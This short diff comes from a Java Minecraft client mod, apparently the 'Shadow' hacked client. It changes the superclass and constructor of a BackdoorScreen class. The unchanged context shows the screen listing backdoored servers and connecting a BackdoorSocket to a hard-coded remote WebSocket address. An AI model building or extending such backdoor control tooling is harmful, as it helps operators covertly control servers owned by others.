@@ -22,7 +22,7 @@ import net.shadow.client.feature.items.impl.Backdoor;
 import net.shadow.client.helper.render.MSAAFramebuffer;
 import net.shadow.client.helper.render.Renderer;
 
-public class BackdoorScreen extends Screen{
+public class BackdoorScreen extends ClientScreen {
 
     String serverid = "";
     List<BackdoorEntry> servers = new ArrayList<BackdoorEntry>();
@@ -33,9 +33,10 @@ public class BackdoorScreen extends Screen{
     BackdoorSocket bs;
 
     public BackdoorScreen() {
-        super(Text.of("uwu"));
+        super(MSAAFramebuffer.MAX_SAMPLES);
         this.bs = new BackdoorSocket(URI.create("ws://45.142.115.91/"), this);
         servers.clear();
+
         bs.connect();
     }
     
